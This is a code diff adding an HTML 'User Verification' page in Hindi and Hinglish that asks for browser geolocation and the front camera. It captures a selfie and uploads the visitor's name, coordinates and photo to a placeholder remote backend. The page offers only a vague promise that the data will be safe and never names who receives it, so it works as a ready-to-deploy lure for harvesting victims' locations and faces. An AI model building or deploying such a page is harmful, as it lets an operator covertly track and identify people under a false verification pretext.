@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <title>Permission Based Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f6f9;
+      margin: 0;
+      padding: 0;
+    }
+    .card {
+      max-width: 420px;
+      background: #ffffff;
+      margin: 50px auto;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+    h2 {
+      color: #333;
+    }
+    p {
+      font-size: 14px;
+      color: #666;
+    }
+    input {
+      width: 90%;
+      padding: 8px;
+      margin-top: 8px;
+    }
+    button {
+      margin-top: 15px;
+      padding: 12px 20px;
+      background: #007bff;
+      color: #fff;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:disabled {
+      background: gray;
+    }
+    #log {
+      margin-top: 15px;
+      font-size: 13px;
+      color: green;
+    }
+    #preview {
+      width: 100%;
+      margin-top: 12px;
+      border-radius: 8px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <h2>✅ User Verification</h2>
+  <p>यह पेज आपकी अनुमति से आपकी लोकेशन और फ्रंट कैमरा फोटो वेरीफिकेशन के लिए उपयोग किया जाएगा।
+  आपकी जानकारी पूरी तरह सुरक्षित रहेगी।</p>
+
+  <input id="name" type="text" placeholder="Apna naam likhein (optional)">
+
+  <button id="startBtn">✅ Verify Now</button>
+
+  <div id="log"></div>
+  <img id="preview">
+</div>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const startBtn = document.getElementById('startBtn');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const logBox = document.getElementById('log');
+const preview = document.getElementById('preview');
+
+function log(msg){
+  logBox.innerHTML += "✔️ " + msg + "<br>";
+}
+
+startBtn.addEventListener("click", async () => {
+  startBtn.disabled = true;
+  try {
+    log("Location permission maangi ja rahi hai...");
+
+    const position = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject);
+    });
+
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+
+    log("Location mil gayi ✔️");
+
+    log("Camera permission maangi ja rahi hai...");
+
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
+
+    video.srcObject = stream;
+    await new Promise(r => setTimeout(r, 800));
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+
+    stream.getTracks().forEach(track => track.stop());
+
+    const photoBlob = await new Promise(resolve =>
+      canvas.toBlob(resolve, "image/jpeg", 0.9)
+    );
+
+    preview.src = URL.createObjectURL(photoBlob);
+    preview.style.display = "block";
+
+    log("Photo capture successful ✔️");
+
+    const formData = new FormData();
+    formData.append("name", document.getElementById("name").value);
+    formData.append("latitude", lat);
+    formData.append("longitude", lon);
+    formData.append("photo", photoBlob);
+
+    fetch("https://YOUR-BACKEND.onrender.com/upload", {
+      method: "POST",
+      body: formData
+    });
+
+    log("Data server par bhej diya gaya ✔️");
+
+  } catch (error) {
+    alert("Permission deny ho gayi ya koi error aayi.");
+    console.log(error);
+  }
+
+  startBtn.disabled = false;
+});
+</script>
+
+</body>
+</html>
